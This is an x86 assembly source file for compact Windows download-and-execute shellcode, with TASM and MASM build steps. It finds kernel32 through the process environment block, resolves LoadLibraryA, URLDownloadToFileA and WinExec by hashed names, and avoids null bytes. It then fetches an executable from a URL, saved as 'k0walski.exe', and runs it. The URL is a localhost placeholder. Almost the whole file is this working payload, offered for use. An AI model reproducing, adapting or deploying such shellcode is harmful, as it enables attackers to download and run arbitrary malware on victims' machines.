comment ~

	Downloads and executes a file from a web server.

	Uses LoadLibraryA, URLDownloadToFileA moniker & WinExec
	
	Variable code size, depending on URL and filename.
	Currently at 213 bytes.
	Target operating system is Win2k/XP.

TASM
	implib -c -f -o -i kernel32.lib %SYSTEMROOT%\system32\kernel32.dll

	tasm32 /dTASM /ml /m9 download_exec1.asm
	tlink32 /Tpe /ap /x download_exec1.obj,,,kernel32.lib
	
MASM
	ml /DMASM /c /coff /Cp /IC:\MASM32\INCLUDE download_exec1.asm
	link /SUBSYSTEM:WINDOWS /LIBPATH:C:\MASM32\LIB /SECTION:.text,W download_exec1.obj

	bcom@hushmail.com

~

.586
.model flat, stdcall

IFDEF MASM
include <kernel32.inc>
include <user32.inc>
.data
pad	db	0
.code
ENDIF

IFDEF TASM
extrn	ExitProcess	:proc
.code
	ret
.data
ENDIF
 
HASH_CONSTANT	EQU	9

;					macro for generating 16-bit api hashes
hashapi	macro	szApi
	local	dwHash
	dwHash = 0

	forc x, <szApi>
		dwHash = dwHash + "&x"
		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
	endm
	dwHash = dwHash and 0ffffh
	dw	dwHash
endm

	assume	fs:nothing

main:
	mov	eax, code_end-entrypoint
;====================================
hLoadLibraryA		equ	ebp+04h
hWinExec			equ	ebp+08h
hURLDownloadToFileA	equ	ebp+0ch
;====================================
entrypoint:
	add	esp, -12
	mov	ebp, esp
	lea	edi, [ebp + 4]

	push	0c356565eh			; pop esi/push esi/push esi/ret
	mov	eax, esp
	call	eax
mem_position:
	inc	byte ptr [esi + (purlmonend - mem_position)]
	inc	byte ptr [esi + (purlend - mem_position)]
	inc	byte ptr [esi + (pfileend - mem_position)]

	lea	esi, [esi + (phashes - mem_position)]
	jmp	getk32_base
phashes:
	hashapi <LoadLibraryA>
	hashapi <WinExec>
	
	db	"URLMON",0ffh,0ffh
purlmonend	equ	$-2
	hashapi <URLDownloadToFileA>
;############################################
szURL:
	db	"http://localhost/file.exe", 0ffh	; download file from..
purlend	equ	$-1
URL_Length	equ	$-szURL
	db	"k0walski.exe", 0ffh			 ; save filename as..
pfileend	equ	$-1
;############################################
getk32_base:
	push	30h
	pop	ecx
	mov	eax, fs:[ecx]
	mov	eax, [eax + 0ch]
	mov	ebx, [eax + 1ch]
	mov	ebx, [ebx]
	mov	ebx, [ebx + 08h]
	
	mov	cl, 2				; get 2 api from kernel32.dll	first
get_apis_loop:
	pushad
	movzx	eax, word ptr[ebx + 3ch] 
	mov	esi, [eax + ebx + 78h]
	lea	esi, [ebx + esi + 1ch]
	lodsd
	add	eax, ebx
	push	eax
	lodsd
	lea	edi, [eax + ebx]
	lodsd
	add	eax, ebx
	push	eax
	xor	ecx, ecx
load_index:
	mov	esi, [edi + 4 * ecx]
	add	esi, ebx
	xor	eax, eax
	cdq
hash_export:
	lodsb	
	add	edx, eax
	rol	edx, HASH_CONSTANT
	dec	eax		
	jns	hash_export
	ror	edx, HASH_CONSTANT
	inc	ecx
	mov	esi, dword ptr [esp + 4 + 8]
	cmp	dx, word ptr [esi]
	jne	load_index
	dec	ecx
	pop	eax
	pop	esi
	movzx	eax,  word ptr[eax + 2 * ecx]
	add	ebx, dword ptr[esi + 4 * eax]
	mov	[esp + 1ch], ebx
	popad
	inc	esi
	inc	esi
	stosd
	loop	get_apis_loop
	
	push	esi
	call	dword ptr[hLoadLibraryA]
	xchg	eax, ebx
	lodsd
	lodsd						; skip URLMON,0xff,0xff
	push	01h					; get 1 api
	pop	ecx
	dec	edx
	jnz	get_apis_loop

	std
	lodsd
	lodsd
	cld

	lea	edi, [URL_Length + esi]

	push	ebx
	push	ebx
	push	edi
	push	esi
	push	ebx
	call	dword ptr[hURLDownloadToFileA]
	
	push	eax
	push	edi	
	call	dword ptr [hWinExec]
code_end:
exit:
	push	eax
	call	ExitProcess
end	main